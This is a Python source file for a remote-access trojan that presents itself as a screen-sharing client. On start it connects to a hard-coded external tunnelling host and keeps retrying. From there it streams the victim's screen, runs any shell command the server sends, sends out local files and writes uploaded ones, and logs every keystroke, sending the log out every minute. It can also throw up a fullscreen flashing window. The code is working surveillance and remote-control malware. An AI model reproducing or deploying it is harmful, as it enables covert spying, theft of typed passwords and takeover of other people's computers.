import socket
import pyautogui
from PIL import Image, ImageGrab
import io
import threading
import time
import platform
import tkinter as tk
from tkinter import messagebox as messagebox
import os
import subprocess
from pynput import keyboard
import asyncio
import base64
import random
import zstandard
import numpy


# NEW PROJECT UNIVERSAL SERVER SENDER/RECEIVER
# MAKE SURE ALL MESSAGES FOLLOW THIS HEADER PATTERN
# <TAG - 1 BYTE><DATA-CLASS - 7 BYTES><SIZE - 20 BYTES><DATA>


class ScreenSharingClient:
    # ------------------------------------------------
    # The Client Brain LOL
    # All you need to know is... this works
    # ------------------------------------------------
    def __init__(self, server_ip="tel-copyrights.gl.at.ply.gg", port=36484):
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_screen_sharing = False
        self.screenshot_thread = None
        self.current_directory = os.getcwd()
        self.delta_base_frame = None

        self.connect_to_server()

    def connect_to_server(self):
        while True:
            try:
                self.socket.connect((self.server_ip, self.port))
                self.start_screen_share()
                threading.Thread(target=self.receive_data).start()
                self.socket.sendall(f"CLIENT_REAL".encode("utf-8"))
                break
            except Exception:
                continue

    def recv_exact(self, sock, num_bytes):
        buf = b""
        while True:
            try:
                while len(buf) < num_bytes:
                    part = sock.recv(num_bytes - len(buf))
                    if not part:
                        break
                    buf += part
            except BlockingIOError:
                continue  # Just in case yk?
            break
        try:
            return buf.decode("utf-8")
        except UnicodeDecodeError:
            return None

    def send_with_tag(
        self,
        headerSEND,
        dataclassSEND,
        sizeSEND: int,
        dataSEND,
        filenameLengthSEND: int = 0,
        filenameSEND="",
    ):
        try:
            if not headerSEND or not dataclassSEND or not sizeSEND or not dataSEND:
                return

            if headerSEND not in ["F", "C", "I", "L", "D"]:
                return
            if isinstance(dataSEND, str):
                data_bytes = dataSEND.encode("utf-8")
            else:
                data_bytes = dataSEND

            # Calculate chunking
            chunk_size = 10000
            needs_chunking = sizeSEND > chunk_size

            if needs_chunking:
                noOfChunks = (len(data_bytes) + chunk_size - 1) // chunk_size

            # Handle File type with filename
            if headerSEND == "F":
                if not filenameSEND or not filenameLengthSEND:
                    return

                if needs_chunking:
                    # Send each chunk with full header
                    for i in range(0, len(data_bytes), chunk_size):
                        chunk = data_bytes[i : i + chunk_size]
                        currChunk = i // chunk_size + 1
                        chunkAndTotal = f">{currChunk:020}{noOfChunks:020}<"
                        self.socket.sendall(headerSEND.encode("utf-8"))
                        self.socket.sendall(dataclassSEND.encode("utf-8"))
                        self.socket.sendall(
                            f"{len(chunkAndTotal) + len(chunk):020}".encode("utf-8")
                        )
                        self.socket.sendall(chunkAndTotal.encode("utf-8"))
                        self.socket.sendall(chunk)
                else:
                    # Send without chunking
                    self.socket.sendall(headerSEND.encode("utf-8"))
                    self.socket.sendall(dataclassSEND.encode("utf-8"))
                    self.socket.sendall(f"{sizeSEND:020}".encode("utf-8"))
                    self.socket.sendall(data_bytes)
                self.socket.sendall(f"{filenameLengthSEND:020}".encode("utf-8"))
                self.socket.sendall(filenameSEND.encode("utf-8"))

            # Handle other types (C, I, L, D)
            else:
                if needs_chunking:
                    # Send each chunk with full header
                    for i in range(0, len(data_bytes), chunk_size):
                        chunk = data_bytes[i : i + chunk_size]
                        currChunk = i // chunk_size + 1
                        chunkAndTotal = f">{currChunk:020}{noOfChunks:020}<"
                        self.socket.sendall(headerSEND.encode("utf-8"))
                        self.socket.sendall(dataclassSEND.encode("utf-8"))
                        self.socket.sendall(
                            f"{len(chunkAndTotal) + len(chunk):020}".encode("utf-8")
                        )
                        self.socket.sendall(chunkAndTotal.encode("utf-8"))
                        self.socket.sendall(chunk)
                else:
                    # Send without chunking
                    self.socket.sendall(headerSEND.encode("utf-8"))
                    self.socket.sendall(dataclassSEND.encode("utf-8"))
                    self.socket.sendall(f"{sizeSEND:020}".encode("utf-8"))
                    self.socket.sendall(data_bytes)

        except (ConnectionError, OSError):
            self.server_disconnection()

    def receive_data(self):
        while True:
            try:
                while True:
                    buf = self.recv_exact(self.socket, 28)
                    if buf:
                        try:
                            header = buf[:1]
                            dataclass = buf[1:8]
                            sizeR = buf[8:29]
                            size = int(sizeR.lstrip("0") or "0")
                            data = self.recv_exact(self.socket, size)
                            # File Communication Logic
                            if header == "F":
                                filenameLengthR = self.recv_exact(self.socket, 20)
                                filenameLength = int(filenameLengthR.lstrip("0") or "0")
                                filename = self.recv_exact(self.socket, filenameLength)
                                locationLengthR = self.recv_exact(self.socket, 20)
                                locationLength = int(locationLengthR.lstrip("0") or "0")
                                location = self.recv_exact(self.socket, locationLength)
                                if dataclass == "fileDow":
                                    if os.path.exists(location):
                                        with open(location, "rb") as fileD:
                                            file_data_D = fileD.read()
                                            base64FileData = base64.b64encode(
                                                file_data_D
                                            ).decode("ascii")
                                        self.send_with_tag(
                                            "F",
                                            "fileDoI",
                                            int(len(base64FileData)),
                                            base64FileData,
                                            filenameLength,
                                            filename,
                                        )
                                    else:
                                        self.send_with_tag("F", "fileDoL", 0, "")
                                elif dataclass == "fileUpl":
                                    if os.path.exists(location):
                                        file_path = os.path.join(location, filename)
                                        with open(file_path, "wb") as f:
                                            try:
                                                f.write(data)
                                            except PermissionError:
                                                self.send_with_tag(
                                                    "F", "fileUpl", 0, ""
                                                )
                                        self.send_with_tag("F", "fileUsu", 0, "")
                                    else:
                                        self.send_with_tag("F", "fileUlo", 0, "")
                                    continue
                                else:
                                    pass
                            # Normal Communication Logic
                            else:
                                if dataclass == "miscCom":
                                    if data.lower() == "flashbang":
                                        try:
                                            self.trigger_flashbang()
                                        except Exception:
                                            pass
                                    elif data.startswith("message"):
                                        message = data[7:]
                                        messagebox.showinfo(
                                            title="You got a Message", message=message
                                        )
                                elif dataclass == "cmdOutI":
                                    if data.startswith("CMD"):
                                        self.stop_screen_share()
                                        cmd = data[3:]
                                        output = self.terminal_function(cmd)
                                        self.send_with_tag(
                                            "C", "cmdOutP", int(len(output)), output
                                        )
                                elif dataclass == "screenV":
                                    if data.lower() == "stop_screenshare":
                                        self.stop_screen_share()
                                    elif data.lower() == "start_screenshare":
                                        self.start_screen_share()
                                else:
                                    pass
                        except BlockingIOError:
                            continue
                        except (ConnectionError, OSError):
                            self.server_disconnection()
            except Exception:
                pass
            except (ConnectionError, ConnectionAbortedError, OSError):
                self.server_disconnection()
                continue

    def start_screen_share(self):
        if not self.is_screen_sharing:
            self.is_screen_sharing = True
            self.start_screenshot_thread()

    def start_screenshot_thread(self):
        self.screenshot_thread = threading.Thread(target=self.send_screenshot)
        self.screenshot_thread.start()

    def send_screenshot(self):
        compressor = zstandard.ZstdCompressor(level=10, threads=2)
        self.delta_base_frame = None
        try:
            while self.is_screen_sharing:
                screenshot = ImageGrab.grab().convert("RGB")
                curr_frame = numpy.array(screenshot, dtype=numpy.uint8)
                image_buf = io.BytesIO()
                Image.fromarray(curr_frame).save(image_buf, format="JPEG", quality=20)
                packet = compressor.compress(image_buf.getvalue())
                tag = "I"

                self.send_with_tag(tag, "screenV", len(packet), packet)
                self.delta_base_frame = curr_frame
                time.sleep(0.1)

        except Exception as e:
            print("Error in screenshot loop:", e)

    def terminal_function(self, cmd):
        try:
            if cmd.startswith("cd"):
                new_dir = cmd[3:].strip()
                if new_dir == "/":
                    new_dir = "C:\\" if os.name == "nt" else "/"
                new_dir = os.path.abspath(os.path.join(self.current_directory, new_dir))
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.current_directory = new_dir
                    response = f"Directory changed to: {new_dir}"
                else:
                    response = f"Directory not found: {new_dir}"
            else:
                # Execute the command synchronously
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=self.current_directory,
                    text=True,
                )
                stdout, stderr = process.communicate()

                stdout_str = stdout
                stderr_str = stderr
                if process.returncode == 0:
                    response = f"{stdout_str}"
                else:
                    response = f"Error: {stderr_str}"

            return response

        except Exception as e:
            error_message = f"Error: {e}"
            return error_message

    # Code by some guy on stackoverflow
    def randomColor(self):
        return "#" + "".join([random.choice("0123456789ABCDEF") for c in range(6)])

    def trigger_flashbang(self):
        if hasattr(self, "error_box") and self.error_box.winfo_exists():
            return

        self.error_box = tk.Tk()
        randomColor1 = self.randomColor()
        randomColor2 = self.randomColor()
        self.error_box.configure(bg=randomColor1)
        self.error_box.attributes("-topmost", True)
        self.error_box.attributes("-fullscreen", True)
        self.error_box.overrideredirect(True)
        self.error_box.resizable(False, False)

        self._flashbang_after_id = None  # save after id globally in self

        def colorFlicker():
            try:
                if not self.error_box.winfo_exists():
                    return
                nonlocal randomColor1, randomColor2
                randomColor1 = self.randomColor()
                randomColor2 = self.randomColor()
                self.error_box.configure(bg=randomColor1)
                self._flashbang_after_id = self.error_box.after(50, colorFlicker)
            except Exception:
                return

        def on_destroy(event=None):
            try:
                if self._flashbang_after_id:
                    self.error_box.after_cancel(self._flashbang_after_id)
            except:
                pass

        self.error_box.bind("<Destroy>", on_destroy)
        colorFlicker()

        self.error_box.mainloop()

    def stop_screen_share(self):
        if self.is_screen_sharing:
            self.is_screen_sharing = False
            if self.screenshot_thread and self.screenshot_thread.is_alive():
                self.screenshot_thread.join()

    def server_disconnection(self):
        self.delta_base_frame = None
        while True:
            try:
                self.socket.connect((self.server_ip, self.port))
                break
            except:
                continue


class Keylogger:
    def __init__(self):
        self.log = []
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            char = key.char
            entry = f"Key pressed: {char}"
        except AttributeError:
            entry = f"Special key pressed: {key}"

        with self.lock:
            self.log.append(entry)

    async def send_log(self):
        while True:
            await asyncio.sleep(60)
            with self.lock:
                if self.log:
                    if client.socket:
                        client.stop_screen_share()
                        await asyncio.sleep(5)
                        log_data = "\n".join(self.log)
                        client.send_with_tag(
                            "L", "LoggerK", int(len(log_data)), log_data
                        )
                        self.log = []
                        client.start_screen_share()
                    else:
                        break

    def start_key_logger(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()


async def main():
    logger = Keylogger()

    logger_thread = threading.Thread(target=logger.start_key_logger)
    logger_thread.daemon = True
    logger_thread.start()

    await logger.send_log()


if __name__ == "__main__":
    client = ScreenSharingClient()
    asyncio.run(main())
